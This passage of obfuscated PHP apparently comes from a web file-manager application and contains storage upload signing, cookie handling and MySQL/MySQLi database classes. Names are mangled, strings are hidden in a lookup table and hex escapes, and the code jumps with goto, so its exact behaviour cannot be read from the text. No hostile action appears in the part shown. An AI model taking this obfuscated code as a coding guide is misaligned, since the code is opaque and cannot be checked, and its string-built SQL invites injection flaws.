$×ø„æ‚¢[12]), array($×ø„æ‚¢[276] => $»Å¹ãÌÓ), array($×ø„æ‚¢[277] => $ØÌ·µ†–), array($×ø„æ‚¢[278] => $¶šı›¹), array($×ø„æ‚¢[279] => $é¹ËÔ÷ï), array($×ø„æ‚¢[280] => $®Øû°œâ))); $è­Ğ™‚­ = base64_encode(json_encode($—œß²ñ×)); $“Ê´™ì‘ = hash_hmac($×ø„æ‚¢[281], $ ºîÏË°, $×ø„æ‚¢[282] . $this->secret, !0); $¯Ë¾¨ = hash_hmac($×ø„æ‚¢[281], $this->region, $“Ê´™ì‘, !0); $È±¡Œüº = hash_hmac($×ø„æ‚¢[281], $«ãõãğë, $¯Ë¾¨, !0); $ÎåÔ‹â¥ = hash_hmac($×ø„æ‚¢[281], $»»Ìå, $È±¡Œüº, !0); $¬ÍÓ¬Œ = hash_hmac($×ø„æ‚¢[281], $è­Ğ™‚­, $ÎåÔ‹â¥); $óç«çÑœ = array($×ø„æ‚¢[237] => $×ø„æ‚¢[12], $×ø„æ‚¢[283] => $×ø„æ‚¢[12], $×ø„æ‚¢[271] => $Ø¥†£“©, $×ø„æ‚¢[276] => $»Å¹ãÌÓ, $×ø„æ‚¢[284] => $è­Ğ™‚­, $×ø„æ‚¢[285] => $ØÌ·µ†–, $×ø„æ‚¢[286] => $¶šı›¹, $×ø„æ‚¢[287] => $é¹ËÔ÷ï, $×ø„æ‚¢[288] => $®Øû°œâ, $×ø„æ‚¢[289] => $¬ÍÓ¬Œ, $×ø„æ‚¢[199] => $this->getHost()); return $óç«çÑœ; } public function multiUploadFormData($ú§êâ©¶, $â‹Å½Á = 3600) { $ŞÙêÍ³« =& $_SERVER[³à¼î¯á]; $’™­¹¦š = gmdate($ŞÙêÍ³«[1518]); $µÈ¯ àÊ = array(); $Ç‰çÎŸ = $this->client->getUploadId($this->bucket, $ú§êâ©¶, $µÈ¯ àÊ); if (!$Ç‰çÎŸ) { return !1; } return array($ŞÙêÍ³«[245] => $Ç‰çÎŸ, $ŞÙêÍ³«[199] => $this->getHost() . $ŞÙêÍ³«[8] . $this->pathEncode($ú§êâ©¶), $ŞÙêÍ³«[246] => $’™­¹¦š, $ŞÙêÍ³«[97] => $ú§êâ©¶); } public function multiUploadAuthData($­Î„÷Üë, $„Œ´±´” = array()) { $ñÁ“èİ =& $_SERVER[³à¼î¯á]; $Í÷­Å† = isset($„Œ´±´”[$ñÁ“èİ[178]]) ? $„Œ´±´”[$ñÁ“èİ[178]] : $ñÁ“èİ[12]; $Ó­ìÓÙÁ = $„Œ´±´”[$ñÁ“èİ[97]]; unset($„Œ´±´”[$ñÁ“èİ[97]]); if (isset($„Œ´±´”[$ñÁ“èİ[247]])) { return $this->listUploadParts($Ó­ìÓÙÁ, $„Œ´±´”); } $ş¼·µô’ = array(); if (isset($„Œ´±´”[$ñÁ“èİ[1519]])) { $ş¼·µô’[$ñÁ“èİ[1520]] = $„Œ´±´”[$ñÁ“èİ[1519]]; } $ñî º·ó = explode($ñÁ“èİ[201], $this->getHost()); $êÓİªîì = array($ñÁ“èİ[1521] => $ñî º·ó[1], $ñÁ“èİ[1522] => $ñÁ“èİ[12], $ñÁ“èİ[237] => $ñÁ“èİ[123], $ñÁ“èİ[283] => $„Œ´±´”[$ñÁ“èİ[79]]); $´¹ÖÃ·­ = $ñÁ“èİ[250]; $ÂúÑÚï = $ñÁ“èİ[8] . $this->pathEncode($Ó­ìÓÙÁ) . $Í÷­Å†; $‚æˆñ™² = $this->client->__getSignatureV4($ş¼·µô’, $êÓİªîì, $´¹ÖÃ·­, $ÂúÑÚï); if (strpos($Í÷­Å†, $ñÁ“èİ[249]) === 0) { if (isset($ş¼·µô’[$ñÁ“èİ[1520]])) { $¡úë¢âæ = $ş¼·µô’[$ñÁ“èİ[1520]]; } else { if (isset($‚æˆñ™²[$ñÁ“èİ[1520]])) { $¡úë¢âæ = $‚æˆñ™²[$ñÁ“èİ[1520]]; } else { $¡úë¢âæ = hash($ñÁ“èİ[281], $ñÁ“èİ[12]); } } return array($ñÁ“èİ[256] => $‚æˆñ™²[$ñÁ“èİ[256]], $ñÁ“èİ[1520] => $¡úë¢âæ, $ñÁ“èİ[246] => $‚æˆñ™²[$ñÁ“èİ[1523]]); } return $‚æˆñ™²[$ñÁ“èİ[256]]; } public function listUploadParts($ÂÖ× ¾Ó, $ÔÉÍ’È¥ = array()) { $Æ¼×ÄëŸ =& $_SERVER[³à¼î¯á]; $Ô—íù´Ä = str_replace($Æ¼×ÄëŸ[257], $Æ¼×ÄëŸ[12], $ÔÉÍ’È¥[$Æ¼×ÄëŸ[178]]); $¾ö¯õÜñ = $this->client->listParts($this->bucket, $ÂÖ× ¾Ó, $Ô—íù´Ä); if (!$¾ö¯õÜñ) { return !1; } $¯ÔÊÎÛè = $Æ¼×ÄëŸ[1524]; foreach ($¾ö¯õÜñ as $¥®Æù¤Ÿ) { $¯ÔÊÎÛè .= $Æ¼×ÄëŸ[1525] . "\74\x50\x61\x72\x74\116\x75\x6d\x62\x65\x72\76{$¥®Æù¤Ÿ[$Æ¼×ÄëŸ[1453]]}\x3c\57\120\x61\162\x74\116\165\x6d\x62\145\x72\76\12" . "\x3c\x45\124\141\147\76{$¥®Æù¤Ÿ[$Æ¼×ÄëŸ[1454]]}\x3c\x2f\x45\x54\x61\x67\76\12" . $Æ¼×ÄëŸ[1526]; } $¯ÔÊÎÛè .= $Æ¼×ÄëŸ[1527]; $¤Ü‘¾É¸ = array(); $ïĞÆù‘µ = explode($Æ¼×ÄëŸ[201], $this->getHost()); $İôÄÕÔç = array($Æ¼×ÄëŸ[1521] => $ïĞÆù‘µ[1], $Æ¼×ÄëŸ[237] => $Æ¼×ÄëŸ[123], $Æ¼×ÄëŸ[283] => strlen($¯ÔÊÎÛè)); $¡Êˆœ±« = $Æ¼×ÄëŸ[248]; $Û–Ò†•È = $Æ¼×ÄëŸ[8] . $this->pathEncode($ÂÖ× ¾Ó) . $ÔÉÍ’È¥[$Æ¼×ÄëŸ[178]]; $º†¿Ïáô = $this->client->__getSignatureV4($¤Ü‘¾É¸, $İôÄÕÔç, $¡Êˆœ±«, $Û–Ò†•È, $¯ÔÊÎÛè); return array($Æ¼×ÄëŸ[256] => $º†¿Ïáô[$Æ¼×ÄëŸ[256]], $Æ¼×ÄëŸ[246] => $º†¿Ïáô[$Æ¼×ÄëŸ[1523]], $Æ¼×ÄëŸ[258] => $¾ö¯õÜñ, $Æ¼×ÄëŸ[1520] => $º†¿Ïáô[$Æ¼×ÄëŸ[1520]]); } public function link($§½Ì ì, $Ë³ËêÍ® = array()) { return parent::link($§½Ì ì, $Ë³ËêÍ®); } public function fileOut($ÒÄœ£‡¶, $±Ù¬‹¬Î = false, $¾É¯îË¦ = false, $¤œ½Ş° = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[³à¼î¯á][1528])) { return parent::fileOutServer($ÒÄœ£‡¶, $±Ù¬‹¬Î, $¾É¯îË¦, $¤œ½Ş°); } parent::fileOut($ÒÄœ£‡¶, $±Ù¬‹¬Î, $¾É¯îË¦, $¤œ½Ş°); } public function fileOutImage($œÔëãáŸ, $ÛÈ³è– = 250) { if (strstr($this->endpoint, $_SERVER[³à¼î¯á][1528])) { return parent::fileOutImageServer($œÔëãáŸ, $ÛÈ³è–); } parent::fileOutImage($œÔëãáŸ, $ÛÈ³è–); } public function fileOutLink($ŸÚ‡ı¹Ş) { $£é˜ƒÊ =& $_SERVER[³à¼î¯á]; if (substr($ŸÚ‡ı¹Ş, 0, 7) == $£é˜ƒÊ[1378]) { $ŸÚ‡ı¹Ş = $£é˜ƒÊ[1379] . substr($ŸÚ‡ı¹Ş, 7); } header($£é˜ƒÊ[165] . $ŸÚ‡ı¹Ş); die; } } goto cï…ù””Š­; A„İ½ÅÆ¸Ş: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Î¸£¼«Ë = '', $‡É¢‰¶ø = 0) { if (is_string($Î¸£¼«Ë) && $Î¸£¼«Ë != $_SERVER[³à¼î¯á][12]) { $this->prefix = $Î¸£¼«Ë; } if (is_numeric($‡É¢‰¶ø) && $‡É¢‰¶ø > 0) { $this->expire = $‡É¢‰¶ø; } } public static function getInstance() { static $Äˆ¹µû; if ($Äˆ¹µû === null) { $Äˆ¹µû = new self(); } return $Äˆ¹µû; } private static $cookieDisable = false; public static function disable($Á¦ûú„) { self::$cookieDisable = $Á¦ûú„; } private static $sameCookieSet = array(); public static function set($ƒôËßÍ¯, $ûÏ‡¶÷Á, $å£üù€ = 0, $¥¿§çüÎ = false, $ÒÌ‚×ƒ¦ = false) { $€ÙÈ¿€Ã =& $_SERVER[³à¼î¯á]; if (self::$cookieDisable) { return; } if (!$å£üù€) { $å£üù€ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ƒôËßÍ¯]) && self::$sameCookieSet[$ƒôËßÍ¯] == $ûÏ‡¶÷Á . $å£üù€) { return; } self::$sameCookieSet[$ƒôËßÍ¯] = $ûÏ‡¶÷Á . $å£üù€; if (!$ÒÌ‚×ƒ¦) { $ÒÌ‚×ƒ¦ = str_replace(HOST, $€ÙÈ¿€Ã[12], APP_HOST); $ÒÌ‚×ƒ¦ = _get($GLOBALS, $€ÙÈ¿€Ã[930], $ÒÌ‚×ƒ¦); } $ãÛü£Ò = $€ÙÈ¿€Ã[12]; setcookie($ƒôËßÍ¯, $ûÏ‡¶÷Á, time() + $å£üù€, $€ÙÈ¿€Ã[8] . trim($ÒÌ‚×ƒ¦, $€ÙÈ¿€Ã[8]) . $ãÛü£Ò, !1, !1, $¥¿§çüÎ); } public static function setSafe($éõé®¬­, $«³½ùÍ, $³Û¨óš” = 0) { self::set($éõé®¬­, $«³½ùÍ, $³Û¨óš”, !0); } public static function get($üŒ’Ââğ) { static $æü„ö = false; if (!$æü„ö) { self::initHeaderCookie(); $æü„ö = !0; } return isset($_COOKIE[$üŒ’Ââğ]) ? $_COOKIE[$üŒ’Ââğ] : !1; } private static function initHeaderCookie() { $‘òÅİ¼¹ =& $_SERVER[³à¼î¯á]; if (!isset($_SERVER[$‘òÅİ¼¹[931]]) || !$_SERVER[$‘òÅİ¼¹[931]]) { return; } $€ùìİ  = explode($‘òÅİ¼¹[74], $_SERVER[$‘òÅİ¼¹[931]]); foreach ($€ùìİ  as $ğÚ¬¢•ä) { $ğÚ¬¢•ä = explode($‘òÅİ¼¹[932], $ğÚ¬¢•ä); if (count($ğÚ¬¢•ä) != 2 || !isset($ğÚ¬¢•ä[1])) { continue; } $_COOKIE[trim($ğÚ¬¢•ä[0])] = trim($ğÚ¬¢•ä[1]); } } public static function remove($Ä°üîı, $· «˜ƒ = false) { unset($_COOKIE[$Ä°üîı]); self::set($Ä°üîı, $_SERVER[³à¼î¯á][12], 1, $· «˜ƒ); } } class DbMysql extends Db { public function __construct($ëÂ³´Êå = '') { $ñáÈíğ =& $_SERVER[³à¼î¯á]; if (!extension_loaded($ñáÈíğ[848])) { think_exception(think_lang($ñáÈíğ[14]) . $ñáÈíğ[933]); } if (!empty($ëÂ³´Êå)) { $this->config = $ëÂ³´Êå; if (empty($this->config[$ñáÈíğ[17]])) { $this->config[$ñáÈíğ[17]] = $ñáÈíğ[12]; } } } public function connect($Ô¡Ä¨ß˜ = '', $¹Ÿ²¦Ù = 0, $î§á‹ÛË = false) { $¼®¬±ÛÎ =& $_SERVER[³à¼î¯á]; if (!isset($this->linkID[$¹Ÿ²¦Ù])) { if (empty($Ô¡Ä¨ß˜)) { $Ô¡Ä¨ß˜ = $this->config; } $ì«îÆ“ = $Ô¡Ä¨ß˜[$¼®¬±ÛÎ[934]] . ($Ô¡Ä¨ß˜[$¼®¬±ÛÎ[935]] ? "\x3a{$Ô¡Ä¨ß˜[$¼®¬±ÛÎ[935]]}" : $¼®¬±ÛÎ[12]); $³¤†ùïõ = !empty($Ô¡Ä¨ß˜[$¼®¬±ÛÎ[17]][$¼®¬±ÛÎ[18]]) ? $Ô¡Ä¨ß˜[$¼®¬±ÛÎ[17]][$¼®¬±ÛÎ[18]] : $this->pconnect; if ($³¤†ùïõ) { $this->linkID[$¹Ÿ²¦Ù] = mysql_pconnect($ì«îÆ“, $Ô¡Ä¨ß˜[$¼®¬±ÛÎ[936]], $Ô¡Ä¨ß˜[$¼®¬±ÛÎ[937]], 131072); } else { $this->linkID[$¹Ÿ²¦Ù] = mysql_connect($ì«îÆ“, $Ô¡Ä¨ß˜[$¼®¬±ÛÎ[936]], $Ô¡Ä¨ß˜[$¼®¬±ÛÎ[937]], !0, 131072); } if (!$this->linkID[$¹Ÿ²¦Ù] || !empty($Ô¡Ä¨ß˜[$¼®¬±ÛÎ[21]]) && !mysql_select_db($Ô¡Ä¨ß˜[$¼®¬±ÛÎ[21]], $this->linkID[$¹Ÿ²¦Ù])) { think_exception(mysql_error()); } $…êò¢ıº = mysql_get_server_info($this->linkID[$¹Ÿ²¦Ù]); mysql_query($¼®¬±ÛÎ[938] . think_config($¼®¬±ÛÎ[939]) . $¼®¬±ÛÎ[58], $this->linkID[$¹Ÿ²¦Ù]); if ($…êò¢ıº > $¼®¬±ÛÎ[940]) { mysql_query($¼®¬±ÛÎ[941], $this->linkID[$¹Ÿ²¦Ù]); } $this->connected = !0; if (1 != think_config($¼®¬±ÛÎ[22])) { unset($this->config); } } return $this->linkID[$¹Ÿ²¦Ù]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($œŞ¹øØŠ) { $íã¿‡©• =& $_SERVER[³à¼î¯á]; if (0 === stripos($œŞ¹øØŠ, $íã¿‡©•[316])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $œŞ¹øØŠ; if ($this->queryID) { $this->free(); } think_action_status($íã¿‡©•[23], 1); think_status($íã¿‡©•[24]); $this->queryID = mysql_query($œŞ¹øØŠ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($»Ë€é¨É) { $“¯•öœ– =& $_SERVER[³à¼î¯á]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $»Ë€é¨É; if ($this->queryID) { $this->free(); } think_action_status($“¯•öœ–[25], 1); think_status($“¯•öœ–[24]); $øÂ«Ç·— = mysql_query($»Ë€é¨É, $this->_linkID); $this->debug(); if (!1 === $øÂ«Ç·—) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[³à¼î¯á][942], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $½·“à™ğ = mysql_query($_SERVER[³à¼î¯á][943], $this->_linkID); $this->transTimes = 0; if (!$½·“à™ğ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¤¿éîÅÙ = mysql_query($_SERVER[³à¼î¯á][944], $this->_linkID); $this->transTimes = 0; if (!$¤¿éîÅÙ) { $this->error(); return !1; } } return !0; } private function getAll() { $½Ì‹ß¦Ü = array(); if ($this->numRows > 0) { while ($ÇªŒ¼˜ = mysql_fetch_assoc($this->queryID)) { $½Ì‹ß¦Ü[] = $ÇªŒ¼˜; } mysql_data_seek($this->queryID, 0); } return $½Ì‹ß¦Ü; } public function getFields($¼²¹†–ş) { $ÇóÏËĞ =& $_SERVER[³à¼î¯á]; $Ú¯Øæß = $this->query($ÇóÏËĞ[945] . $this->parseKey($¼²¹†–ş)); $‚Ÿ‰’ş = array(); if ($Ú¯Øæß) { foreach ($Ú¯Øæß as $ˆî‰àÏ¯ => $´‚¾¡Œ¾) { $‚Ÿ‰’ş[$´‚¾¡Œ¾[$ÇóÏËĞ[31]]] = array($ÇóÏËĞ[32] => $´‚¾¡Œ¾[$ÇóÏËĞ[31]], $ÇóÏËĞ[33] => $´‚¾¡Œ¾[$ÇóÏËĞ[34]], $ÇóÏËĞ[35] => (bool) (strtoupper($´‚¾¡Œ¾[$ÇóÏËĞ[36]]) === $ÇóÏËĞ[946]), $ÇóÏËĞ[37] => $´‚¾¡Œ¾[$ÇóÏËĞ[38]], $ÇóÏËĞ[39] => strtolower($´‚¾¡Œ¾[$ÇóÏËĞ[40]]) == $ÇóÏËĞ[41], $ÇóÏËĞ[42] => strtolower($´‚¾¡Œ¾[$ÇóÏËĞ[43]]) == $ÇóÏËĞ[44]); } } return $‚Ÿ‰’ş; } public function getTables($©Ÿã…¸ = '') { $„½–•Íû =& $_SERVER[³à¼î¯á]; if (!empty($©Ÿã…¸)) { $ƒèèÖò = $„½–•Íû[947] . $©Ÿã…¸ . $„½–•Íû[948]; } else { $ƒèèÖò = $„½–•Íû[949]; } $¨óÎó§ = $this->query($ƒèèÖò); $ñØ«‰©¨ = array(); foreach ($¨óÎó§ as $Öú³õº => $º›©Ö½©) { $ñØ«‰©¨[$Öú³õº] = current($º›©Ö½©); } return $ñØ«‰©¨; } public function replace($ø‰Ëæ†, $àçû‚›½ = array()) { $Ä–Ğ„œµ =& $_SERVER[³à¼î¯á]; foreach ($ø‰Ëæ† as $ËâÖÒË• => $¸šıÏş) { $á”Ïš×± = $this->parseValue($¸šıÏş); if (is_scalar($á”Ïš×±)) { $Å÷ë¡†ˆ[] = $á”Ïš×±; $”¦·È› [] = $this->parseKey($ËâÖÒË•); } } $ôüÚÏË³ = $Ä–Ğ„œµ[950] . $this->parseTable($àçû‚›½[$Ä–Ğ„œµ[331]]) . $Ä–Ğ„œµ[951] . implode($Ä–Ğ„œµ[50], $”¦·È› ) . $Ä–Ğ„œµ[952] . implode($Ä–Ğ„œµ[50], $Å÷ë¡†ˆ) . $Ä–Ğ„œµ[953]; return $this->execute($ôüÚÏË³); } public function insertAll($í ÚÙ, $„‘»‘Œ¤ = array(), $“²İ…º¿ = false) { $ŒÖ‚×ñ‘ =& $_SERVER[³à¼î¯á]; if (!is_array($í ÚÙ[0])) { return !1; } $·ÄïÀ¿Å = array_keys($í ÚÙ[0]); $ûíŸáÒé = array(); foreach ($í ÚÙ as $ø“ÒıÆ•) { $¶Ş³Ì¥ã = array(); foreach ($ø“ÒıÆ• as $·Ÿ¡£Í¯ => $Ô§˜Ï‡Ş) { $Ô§˜Ï‡Ş = $this->parseValue($Ô§˜Ï‡Ş); if (is_scalar($Ô§˜Ï‡Ş)) { $¶Ş³Ì¥ã[] = $Ô§˜Ï‡Ş; } } $ûíŸáÒé[] = $ŒÖ‚×ñ‘[312] . implode($ŒÖ‚×ñ‘[50], $¶Ş³Ì¥ã) . $ŒÖ‚×ñ‘[953]; } array_walk($·ÄïÀ¿Å, array($this, $ŒÖ‚×ñ‘[954])); $ˆõöÓº = ($“²İ…º¿ ? $ŒÖ‚×ñ‘[955] : $ŒÖ‚×ñ‘[956]) . $ŒÖ‚×ñ‘[957] . $this->parseTable($„‘»‘Œ¤[$ŒÖ‚×ñ‘[331]]) . $ŒÖ‚×ñ‘[951] . implode($ŒÖ‚×ñ‘[50], $·ÄïÀ¿Å) . $ŒÖ‚×ñ‘[958] . implode($ŒÖ‚×ñ‘[50], $ûíŸáÒé); return $this->execute($ˆõöÓº); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $„Œ—ŠÔş =& $_SERVER[³à¼î¯á]; $this->error = mysql_errno() . $„Œ—ŠÔş[4] . mysql_error($this->_linkID); if ($„Œ—ŠÔş[12] != $this->queryStr) { $this->error .= LNG($„Œ—ŠÔş[48]) . $this->queryStr; } think_trace($this->error, $„Œ—ŠÔş[12], $„Œ—ŠÔş[49]); return $this->error; } public function escapeString($è®ä®•‹) { if ($this->_linkID) { return mysql_real_escape_string($è®ä®•‹, $this->_linkID); } else { return mysql_escape_string($è®ä®•‹); } } public function parseKey(&$³õè¹ŠÛ, $‹Ïº€È© = true) { $˜ôƒ®Ê¬ =& $_SERVER[³à¼î¯á]; if ($‹Ïº€È©) { $³õè¹ŠÛ = $this->parseKeyCheck($³õè¹ŠÛ); } if ($³õè¹ŠÛ != $˜ôƒ®Ê¬[211] && !preg_match($˜ôƒ®Ê¬[959], $³õè¹ŠÛ)) { $³õè¹ŠÛ = $˜ôƒ®Ê¬[436] . trim($³õè¹ŠÛ, $˜ôƒ®Ê¬[436]) . $˜ôƒ®Ê¬[436]; } return $³õè¹ŠÛ; } } class DbMysqli extends Db { public function __construct($êˆØ±¸² = '') { $¾™¥“á =& $_SERVER[³à¼î¯á]; if (!extension_loaded($¾™¥“á[960])) { think_exception(think_lang($¾™¥“á[14]) . $¾™¥“á[961]); } if (!empty($êˆØ±¸²)) { $this->config = $êˆØ±¸²; if (empty($this->config[$¾™¥“á[17]])) { $this->config[$¾™¥“á[17]] = $¾™¥“á[12]; } } } public function connect($ñËÁ­ = '', $Ë®²–ÎÕ = 0) { $À²„®¥› =& $_SERVER[³à¼î¯á]; if (!isset($this->linkID[$Ë®²–ÎÕ])) { if (empty($ñËÁ­)) { $ñËÁ­ = $this->config; } $this->linkID[$Ë®²–ÎÕ] = new mysqli($ñËÁ­[$À²„®¥›[934]], $ñËÁ­[$À²„®¥›[936]], $ñËÁ­[$À²„®¥›[937]], $ñËÁ­[$À²„®¥›[21]], $ñËÁ­[$À²„®¥›[935]] ? intval($ñËÁ­[$À²„®¥›[935]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¹†áÚ– = $this->linkID[$Ë®²–ÎÕ]->server_version; $this->linkID[$Ë®²–ÎÕ]->query($À²„®¥›[938] . think_config($À²„®¥›[939]) . $À²„®¥›[58]); if ($¹†áÚ– > $À²„®¥›[940]) { $this->linkID[$Ë®²–ÎÕ]->query($À²„®¥›[941]); } $this->connected = !0; if (1 != think_config($À²„®¥›[22])) { unset($this->config); } } return $this->linkID[$Ë®²–ÎÕ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($™•Éö¬’) { $¸¬û·ÙÖ =& $_SERVER[³à¼î¯á]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $™•Éö¬’; if ($this->queryID) { $this->free(); } think_action_status($¸¬û·ÙÖ[23], 1); think_status($¸¬û·ÙÖ[24]); $this->queryID = $this->_linkID->query($™•Éö¬’); if ($this->_linkID->more_results()) { while (($Âî‹¢Ú¨ = $this->_linkID->next_result()) != NULL) { $Âî‹¢Ú¨->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Ïš×çÍÛ) { $›­—‘Î¯ =& $_SERVER[³à¼î¯á]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ïš×çÍÛ; if ($this->queryID) { $this->free(); } think_action_status($›­—‘Î¯[25], 1); think_status($›­—‘Î¯[24]); $¬—ş¬× = $this->_linkID->query($Ïš×çÍÛ); $this->debug(); if (!1 === $¬—ş¬×) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ûšÀÔÍ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ûšÀÔÍ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Øúè“ĞÆ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Øúè“ĞÆ) { $this->error(); return !1; } } return !0; } private function getAll() { $›ƒÜÖÊ‰ = array(); if ($this->numRows > 0) { for ($³ËÄú… = 0; $³ËÄú… < $this->numRows; $³ËÄú…++) { $›ƒÜÖÊ‰[$³ËÄú…] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $›ƒÜÖÊ‰; } public function getFields($Îî¢¹‡) { $û‡»Áòä =& $_SERVER[³à¼î¯á]; $Î«ˆÚÃ = $this->query($û‡»Áòä[945] . $this->parseKey($Îî¢¹‡)); $³ûã¦ÔÎ = array(); if ($Î«ˆÚÃ) { foreach ($Î«ˆÚÃ as $“¶—É§ => $öêØ‹ìù) { $³ûã¦ÔÎ[$öêØ‹ìù[$û‡»Áòä[31]]] = array($û‡»Áòä[32] => $öêØ‹ìù[$û‡»Áòä[31]], $û‡»Áòä[33] => $öêØ‹ìù[$û‡»Áòä[34]], $û‡»Áòä[35] => (bool) ($öêØ‹ìù[$û‡»Áòä[36]] === $û‡»Áòä[12]), $û‡»Áòä[37] => $öêØ‹ìù[$û‡»Áòä[38]], $û‡»Áòä[39] => strtolower($öêØ‹ìù[$û‡»Áòä[40]]) == $û‡»Áòä[41], $û‡»Áòä[42] => strtolower($öêØ‹ìù[$û‡»Áòä[43]]) == $û‡»Áòä[44]); } } return $³ûã¦ÔÎ; } public function getTables($´ºŞ» = '') { $¿„–Ÿ‚‹ =& $_SERVER[³à¼î¯á]; $ÎË¦èÂÀ = !empty($´ºŞ») ? $¿„–Ÿ‚‹[947] . $´ºŞ» . $¿„–Ÿ‚‹[948] : $¿„–Ÿ‚‹[949]; $¯²‰œ© = $this->query($ÎË¦èÂÀ); $™ŠÎ¯Âã = array(); if ($¯²‰œ©) { foreach ($¯²‰œ© as $€È©¯ıƒ => $ú»ãÔ’Š) { $™ŠÎ¯Âã[$€È©¯ıƒ] = current($ú»ãÔ’Š); } } return $™ŠÎ¯Âã; } public function replace($Ú¢›ˆ º, $Æì„³´ö = array()) { $ì­²¶ëÙ =& $_SERVER[³à¼î¯á]; foreach ($Ú¢›ˆ º as $ğÇÑ¶Ø => $Ñ‡˜ˆùÑ) { $èÙœù±¥ = $this->parseValue($Ñ‡˜ˆùÑ); if (is_scalar($èÙœù±¥)) { $ÊÎË±×[] = $èÙœù±¥; $ÅÒØÜå½[] = $this->parseKey($ğÇÑ¶Ø); } } $á·é¸œ¡ = $ì­²¶ëÙ[950] . $this->parseTable($Æì„³´ö[$ì­²¶ëÙ[331]]) . $ì­²¶ëÙ[951] . implode($ì­²¶ëÙ[50], $ÅÒØÜå½) . $ì­²¶ëÙ[952] . implode($ì­²¶ëÙ[50], $ÊÎË±×) . $ì­²¶ëÙ[953]; return $this->execute($á·é¸œ¡); } public function insertAll($·§÷ÕÏÃ, $ùªš÷µ = array(), $éÉğùÇÏ = false) { $ÆÆ•òÍ£ =& $_SERVER[³à¼î¯á]; if (!is_array($·§÷ÕÏÃ[0])) { return !1; } $–¢œÀ«Ÿ = array_keys($·§÷ÕÏÃ[0]); $±†ÏÂúà = array(); foreach ($·§÷ÕÏÃ as $—²ÑÆ…°) { $ê¤§ğÅ‚ = array(); foreach ($—²ÑÆ…° as $üŞÙö‚¹ => $»‰Æôçã) { $»‰Æôçã = $this->parseValue($»‰Æôçã); if (is_scalar($»‰Æôçã)) { $ê¤§ğÅ‚[] = $»‰Æôçã; } } $±†ÏÂúà[] = $ÆÆ•òÍ£[312] . implode($ÆÆ•òÍ£[50], $ê¤§ğÅ‚) . $ÆÆ•òÍ£[953]; } array_walk($–¢œÀ«Ÿ, array($this, $ÆÆ•òÍ£[954])); $é˜‚Š©¿ = $éÉğùÇÏ ? $ÆÆ•òÍ£[955] : $ÆÆ•òÍ£[956]; $öıòŸœú = $é˜‚Š©¿ . $ÆÆ•òÍ£[957] . $this->parseTable($ùªš÷µ[$ÆÆ•òÍ£[331]]) . $ÆÆ•òÍ£[951] . implode($ÆÆ•òÍ£[50], $–¢œÀ«Ÿ) . $ÆÆ•òÍ£[958] . implode($ÆÆ•òÍ£[50], $±†ÏÂúà); return $this->execute($öıòŸœú); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ßÙ­†äé =& $_SERVER[³à¼î¯á]; $this->error = $this->_linkID->errno . $ßÙ­†äé[4] . $this->_linkID->error; if ($ßÙ­†äé[12] != $this->queryStr) { $this->error .= LNG($ßÙ­†äé[48]) . $this->queryStr; } think_trace($this->error, $ßÙ­†äé[12], $ßÙ­†äé[49]); return $this->error; } public function escapeString($È·Êı·ø) { if ($this->_linkID) { return $this->_linkID->real_escape_string($È·Êı·ø); } else { return addslashes($È·Êı·ø); } } public function parseKey(&$åĞõ¸ñÃ, $úÜéïøÓ = true) { $Ïš—à™Î =& $_SERVER[³à¼î¯á]; if ($úÜéïøÓ) { $åĞõ¸ñÃ = $this->parseKeyCheck($åĞõ¸ñÃ); } if ($åĞõ¸ñÃ != $Ïš—à™Î[211] && !preg_match($Ïš—à™Î[959], $åĞõ¸ñÃ)) { $åĞõ¸ñÃ = $Ïš—à™Î[436] . trim($åĞõ¸ñÃ, $Ïš—à™Î[436]) . $Ïš—à™Î[436]; } return $åĞõ¸ñÃ; } } goto D®øŞÔ¹‹ñ; cå¸¦Æ¥: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\163\157\x75\x72\x63\x65\123\x65\x63\x72\x65\x74\114\x69\163\164"; public $field = array("\x73\157\165\162\x63\x65\x49\104", "\164\171\160\145\111\x44", "\143\162\x65\141\x74\x65\x55\163\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x73\164\x6f\x72\141\x67\145\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\163\151\172\145\x4d\x61\x78", "\163\171\x73\164\x65\155", "\x64\145\x66\x61\165\154\x74", "\144\x72\151\x76\x65\x72", "\x63\157\x6e\146\x69\147"); public function listData($Éğä™¡™ = false, 